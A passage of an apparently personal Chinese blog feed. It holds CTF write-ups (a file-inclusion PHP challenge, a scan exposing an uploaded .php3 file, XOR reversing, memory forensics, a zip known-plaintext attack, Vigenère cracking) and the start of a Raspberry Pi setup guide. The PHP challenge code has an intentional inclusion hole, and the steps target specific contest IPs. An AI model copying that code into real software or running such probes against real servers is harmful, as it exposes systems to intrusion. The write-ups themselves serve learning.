        <content type="html"><![CDATA[<h2 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h2><ul><li><p>打开所给的链接，得到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);php</span><br><span class="line"><span class="comment">//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$file</span> === <span class="string">&quot;phpinfo&quot;</span> ) &#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/proc/i&#x27;</span> , <span class="variable">$file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;/var/www/html/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="variable">$content</span> ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nothing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&quot;/script|&lt;\?/i&quot;</span>, <span class="variable">$content</span>) ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;bypass me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="variable">$file</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>访问<code>http://47.111.96.55:52908/?file=phpinfo</code></p></li><li><p>搜索字符串flag，直接找到flag<img src="C:\Users\86198\AppData\Roaming\Typora\typora-user-images\image-20201101203846002.png" alt="image-20201101203846002"></p></li></ul><h2 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h2><ul><li>打开页面是是一个网站，但是好像没用什么信息</li><li>扫描后台发现<code>http://47.111.104.99:50600/upload/watermark/</code></li><li>访问后有一堆文件</li><li>访问<code>http://47.111.104.99:50600/upload/watermark/72121604232558.php3</code></li><li>得到flag<img src="C:\Users\86198\AppData\Roaming\Typora\typora-user-images\image-20201101212232809.png" alt="image-20201101212232809"></li></ul><h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><ul><li><p>将下载的文件用ida64打开，双击进入main函数反编译，得到代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(</span><br><span class="line">    &amp;v15,</span><br><span class="line">    <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span>,</span><br><span class="line">    &amp;v10);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v10);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(</span><br><span class="line">    &amp;v16,</span><br><span class="line">    <span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span>,</span><br><span class="line">    v3);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Please input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v16);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::length(&amp;v16) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;length error&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::length(&amp;v16) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::substr(&amp;v17, &amp;v16, i, <span class="number">1LL</span>);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v14, &amp;v17);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v17);</span><br><span class="line">    v11 = *(_BYTE *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>[](&amp;v14, <span class="number">0LL</span>);</span><br><span class="line">    v13 = i ^ v11;</span><br><span class="line">    v11 ^= i;</span><br><span class="line">    v7 = (_BYTE *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>[](&amp;v16, i);</span><br><span class="line">    *v7 = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::compare(&amp;v16, &amp;v15) == <span class="number">0</span> )</span><br><span class="line">    v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Good,you got it,flag is flag&#123;your input&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;nonononono :(&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>分析代码可知，就是简单的异或，python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i^<span class="built_in">ord</span>(<span class="built_in">str</span>[i]))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#7e02a9c4439056df0e2a7b432b0069b3</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><ul><li>提示为：we need sha1(password)!!!</li><li>将下载得到的文件解压，放入kali中，用volatility进行取证</li><li>得到paswword为<code>qwer1234</code></li><li>将其sha1加密后就是flag<code>db25f2fc14cd2d2b1e7af307241f548fb03c312a</code></li></ul><h2 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h2><ul><li>下载得到一个加密的zip压缩包，发现其中有三个txt</li><li>用7-zip可以提取出minwen-副本.txt，打开txt，观察内容，可以推测可以用明文爆破</li><li>将minwen-副本.txt压缩成mingwen - 副本.zip，作为明文，用ARCHPA工具对加密的压缩包进行爆破（需删除里面校验码不同的文件）</li><li>得到密钥为<code>123%asd!O</code></li><li>将flag.txt解压出来，得到仅需5，跳过去<br>ffd5e341le25b2dcab15cbb}gc3bc5b{789b51</li><li>在线网站栅栏解密，每组字数5，得到flag<code>febc7d2138555b9ebccb32b554dbb11c</code></li></ul><h2 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h2><ul><li><p>提示为：维吉尼亚，获取秘钥（全大写字母）并转为MD5提交</p></li><li><p>将所给的密文放入脚本去爆破密钥长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 –*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c_alpha</span>(<span class="params">cipher</span>):</span>   <span class="comment"># 去掉非字母后的密文</span></span><br><span class="line">    cipher_alpha = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        <span class="keyword">if</span> (cipher[i].isalpha()):</span><br><span class="line">            cipher_alpha += cipher[i]</span><br><span class="line">    <span class="keyword">return</span> cipher_alpha</span><br><span class="line"><span class="comment"># 计算cipher的重合指数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_CI</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    N = [<span class="number">0.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line">    cipher = c_alpha(cipher)</span><br><span class="line">    L = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):     <span class="comment">#计算所有字母的频数，存在数组N当中</span></span><br><span class="line">            <span class="keyword">if</span> (cipher[i].islower()):</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 N[<span class="built_in">ord</span>(cipher[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] += <span class="number">1</span></span><br><span class="line">    CI_1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        CI_1 += ((N[i] / L) * ((N[i]-<span class="number">1</span>) / (L-<span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> CI_1</span><br><span class="line"><span class="comment"># 计算秘钥长度为 key_len 的重合指数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_key_len_CI</span>(<span class="params">cipher,key_len</span>):</span></span><br><span class="line">    un_cip = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]    <span class="comment"># un_cip 是分组</span></span><br><span class="line">    aver_CI = <span class="number">0.0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_alpha)):</span><br><span class="line">        z = i % key_len</span><br><span class="line">        un_cip[z] += cipher_alpha[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        un_cip[i]= count_CI(un_cip[i])</span><br><span class="line">        aver_CI += un_cip[i]</span><br><span class="line">    aver_CI = aver_CI/<span class="built_in">len</span>(un_cip)</span><br><span class="line">    <span class="keyword">return</span> aver_CI</span><br><span class="line"><span class="comment">## 找出最可能的前十个秘钥长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre_10</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    M = [(<span class="number">1</span>,count_CI(cipher))]+[(<span class="number">0</span>,<span class="number">0.0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">50</span>):</span><br><span class="line">        M[i] = (i,<span class="built_in">abs</span>(<span class="number">0.065</span> - count_key_len_CI(cipher,i)))</span><br><span class="line">    M = <span class="built_in">sorted</span>(M,key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>])   <span class="comment">#按照数组第二个元素排序</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span> (M[i])</span><br><span class="line">F = [</span><br><span class="line"><span class="number">0.0651738</span>, <span class="number">0.0124248</span>, <span class="number">0.0217339</span>,</span><br><span class="line"><span class="number">0.0349835</span>, <span class="number">0.1041442</span>, <span class="number">0.0197881</span>,</span><br><span class="line"><span class="number">0.0158610</span>, <span class="number">0.0492888</span>, <span class="number">0.0558094</span>,</span><br><span class="line"><span class="number">0.0009033</span>, <span class="number">0.0050529</span>, <span class="number">0.0331490</span>,</span><br><span class="line"><span class="number">0.0202124</span>, <span class="number">0.0564513</span>, <span class="number">0.0596302</span>,</span><br><span class="line"><span class="number">0.0137645</span>, <span class="number">0.0008606</span>, <span class="number">0.0497563</span>,</span><br><span class="line"><span class="number">0.0515760</span>, <span class="number">0.0729357</span>, <span class="number">0.0225134</span>,</span><br><span class="line"><span class="number">0.0082903</span>, <span class="number">0.0171272</span>, <span class="number">0.0013692</span>,</span><br><span class="line"><span class="number">0.0145984</span>, <span class="number">0.0007836</span></span><br><span class="line">]       <span class="comment"># 英文字符频率。</span></span><br><span class="line">cipher = <span class="string">&#x27;SZWLVSRVVZICMUOJYIIZBSVSSITFSWHPCWCFPVPFXJMWRVJICVRGTCFLHPRJKJKSRVWYFUSEWHFXLHFOSFLYPFXXYFPOEGXFXMBUHVNIYHNDWXPGBXWSYBNDVQRVYRTZUWKTFSKUMVERCCRSBEMKEDRUNYYVRYKXFOKVLVXYGTRQZOEHFEYKJRKRVXFPBOINXFTCSRQCKIGBXWLVOQVVOSFLCRRWXYFQWUHWFGRVVZICMYBUQSKJASUWLRURVVBAVSCTZOPVEUWKKGLQZCRUHJBLRSRSBTFSCYIJICFVDRUUFSIHWYFQONPEGTYBUSMTUSFVVLLOEIGRRGFEGJKIKPMYURAEBHOIIVFNMBVRJKICGYHPMFQOJVLVQYGJHHZUUOJOESFJZVGSIBLUVPEINYZRGISVRHFKIIHPSRWHZTYDGRMEUKSEWMKXYGVPTKZQVVGMUOMHCLOVUMRIRTKICXRUJFSDSRUSWLGZCLRXTMAVESUZQCDDRRHCRKRTLUGHZQXFPLSFIXYFAIGESRSBGRVWYFDSCOTRTRWKZICMRVFXKYUYZZFIKPFSIVICGYTKHVJVAVRIECMYGKKMJJQVROPKIGBBQSKIGBXRJKVKPCLRXEMKEVXRJPGYRASSYJVWLVZJZROPKIGBBPIRUFCDHAYZGKFXPUORGRBEEZRVZQKRCMIKLXVWCBZIMWFJZFIJKICHFSSWUFSYRYJFUVZFLNBQJVUCCJISCBXIVCRFZRUPUBURAEXMICGXYFDOCORVWCFTRQVUMOEHRUJUCEGIIIMKDDRPNGZVVMMFDOCOIECWHYLWKJKSJKIJBGRROSLEGALVXSFESKWMEHQCDHAYFPSEHEIUFSTHRKSCCWWLVFYFKKPVUKSJHIKIYHNRYCEZSWRYIUFCLVEEEKWCHWUPUBZWLZOITFUCFVQSVDPZDCVRGPVBPBKVIMFPOCWLZOEGFIXYJQGFUXZOFSIOIJTMBJLRKICGTKSFMPCFPEEERVFXKYUFWJZEJOMHRYIIZECFGSGQMFKXRZUWTFUWYPUWEJSWGFSINRFXJSUJIRTRVVUINBQBFRRVUMZZVXVORCYHVJUGZCLXNBQUFRHGSYQKLGVUMGRBMKPTSIBIJUFOKVESPSHKKIIJEVKGMJUYBTHFLURVVQMNPLRVUAYBRZRWMKVBSFUPFOEWKXHVJTSXRXKPYZZFIYBBBFLHVBUVRWPRUGHLGINBQCIOSEHGHLGIVJRVVUFLURVFXKYURVVBAVSCBZFIXSYBUZSIEQHFVEPQPSJHRKMWGYHFVHYBRJEZOGKFQHVSGTZVLRMJTROPIJEVKWLIPSUYWLVFYFKKLFXDIEQCZUJZJHIDUMQFPIFVRODRRXUFSGHSGMCHYDXNBJYNLXYUFSZULVBBGURAEXYFUWLVBLHZSEKIGSJLXYJLYJKINBQFRWLVSEZRGXYFPSNDWEPMBVOMJUCBZQKKIGGKLQVBQWKGMUORGFXRUBROCOXYFPWXKXNPPRSXXZTFOCOLRWCHFDWBUFSDZLRURVVQEDFMTKKITPSBKUCZTWCLNRFXNZVDWVNYODLWKIGGEHAQFYZRQHFSYIJWVRMGORQHJICHILIUUMQLUXJFWOJVLVTNCBHJROAMTXVKTCMZQKRTWCLUIWBJZZQKKIPCLJLKICOZUHFZMIKKMELWCLFSLMBARQEXFGHRQHNIYHRQMXOMFRQXCJRHCHKZSJGYHPCUFWENQVGMFRVOZOEBFLXCMLSMHVUPRCRVOGFPVRSWZTFOCOWVFGHNUMKUCBLSWFNCKYHVV&#x27;</span></span><br><span class="line">cipher_alpha = c_alpha(cipher)</span><br><span class="line">print(<span class="string">u&quot;秘钥长度为:&quot;</span>)</span><br><span class="line">pre_10(cipher)</span><br></pre></td></tr></table></figure></li><li><p><img src="C:\Users\86198\AppData\Roaming\Typora\typora-user-images\image-20201101231207472.png" alt="image-20201101231207472"></p></li><li><p>根据密钥长度为7，将明文放进在线网站去爆破，最终得到300个密钥</p></li><li><p>将其中之一密钥<code>ORDERBY</code>md5加密后就是flag<code>c82bbc1ac4ab644c0aa81980ed2eb25b</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派食用指南</title>
      <link href="2020/10/06/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
      <url>2020/10/06/%E6%A0%91%E8%8E%93%E6%B4%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="树莓派食用指南"><a href="#树莓派食用指南" class="headerlink" title="树莓派食用指南"></a>树莓派食用指南</h1><p>机缘巧合下，我拥有了一个树莓派4B+，也让我趁机研究了一段时间这个小小的东西。<a href="https://shumeipai.nxez.com/">树莓派实验室</a>应该是最全的入门指南，本教程只是一个简单的应用，更加详细的教程可以去实验室官网看看。</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>首先我们需要连接上我们的树莓派，<a href="https://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html">无屏幕，无其他设备首次连接树莓派</a></p><h2 id="WiFi-网络配置"><a href="#WiFi-网络配置" class="headerlink" title="WiFi 网络配置"></a>WiFi 网络配置</h2><p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 wpa_supplicant.conf 配置文件连接 WiFi 设备。</p><p>操作方法简单：将刷好 Raspbian 系统的 SD 卡用电脑读取。在 boot 分区，也就是树莓派的 <code>/boot</code> 目录下新建 wpa_supplicant.conf 文件，按照下面的参考格式填入内容并保存 wpa_supplicant.conf 文件。</p><p><strong>注意：</strong>每次启动后wpa_supplicant.conf 这个文件会<strong>消失</strong>，需重新添加；而且在安装xrdp时需要变更安装源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">country&#x3D;CN</span><br><span class="line">ctrl_interface&#x3D;DIR&#x3D;&#x2F;var&#x2F;run&#x2F;wpa_supplicant GROUP&#x3D;netdev</span><br><span class="line">update_config&#x3D;1</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">ssid&#x3D;&quot;WiFi-A&quot;</span><br><span class="line">psk&#x3D;&quot;12345678&quot;</span><br><span class="line">key_mgmt&#x3D;WPA-PSK</span><br><span class="line">priority&#x3D;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">ssid&#x3D;&quot;WiFi-B&quot;</span><br><span class="line">psk&#x3D;&quot;12345678&quot;</span><br><span class="line">key_mgmt&#x3D;WPA-PSK</span><br><span class="line">priority&#x3D;2</span><br><span class="line">scan_ssid&#x3D;1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明以及不同安全性的 WiFi 配置示例：</p><blockquote><p><strong>#ssid:网络的ssid</strong><br><strong>#psk:密码</strong><br><strong>#priority:连接优先级，数字越大优先级越高（不可以是负数）</strong><br><strong>#scan_ssid:连接隐藏WiFi时需要指定该值为1</strong></p></blockquote><p>如果你的 WiFi 没有密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">network&#x3D;&#123;</span><br><span class="line">ssid&#x3D;&quot;你的无线网络名称（ssid）&quot;</span><br><span class="line">key_mgmt&#x3D;NONE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你的 WiFi 使用WEP加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">network&#x3D;&#123;</span><br><span class="line">ssid&#x3D;&quot;你的无线网络名称（ssid）&quot;</span><br><span class="line">key_mgmt&#x3D;NONE</span><br><span class="line">wep_key0&#x3D;&quot;你的wifi密码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你的 WiFi 使用WPA/WPA2加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">network&#x3D;&#123;</span><br><span class="line">ssid&#x3D;&quot;你的无线网络名称（ssid）&quot;</span><br><span class="line">key_mgmt&#x3D;WPA-PSK</span><br><span class="line">psk&#x3D;&quot;你的wifi密码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你不清楚 WiFi 的加密模式，可以在安卓手机上用 root explorer 打开 <code>/data/misc/wifi/wpa/wpa_supplicant.conf</code>，查看 WiFi 的信息。</p><h3 id="开启-SSH-服务"><a href="#开启-SSH-服务" class="headerlink" title="开启 SSH 服务"></a>开启 SSH 服务</h3><p>在 boot 分区新建一个文件，空白的即可，文件命名为 ssh。注意要小写且不要有任何扩展名</p><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>默认的用户名: pi<br>默认的密码是: raspberry</p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd pi</span><br></pre></td></tr></table></figure><h2 id="更换数据源，更新数据"><a 